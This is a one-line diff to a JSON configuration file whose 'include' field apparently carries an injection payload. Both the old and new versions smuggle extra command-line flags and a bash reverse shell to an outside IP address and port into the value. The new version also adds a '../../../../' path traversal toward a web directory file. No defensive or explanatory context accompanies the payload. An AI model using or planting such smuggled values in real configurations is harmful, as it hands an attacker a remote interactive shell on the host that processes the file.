@@ -1,1 +1,1 @@
-{"include":[" -T -TT \"bash -i >& /dev/tcp/153.126.190.183/889 0>&1\""]}
+{"include":["../../../../var/www/repos.json -T -TT \"bash -i >& /dev/tcp/153.126.190.183/889 0>&1\""]}
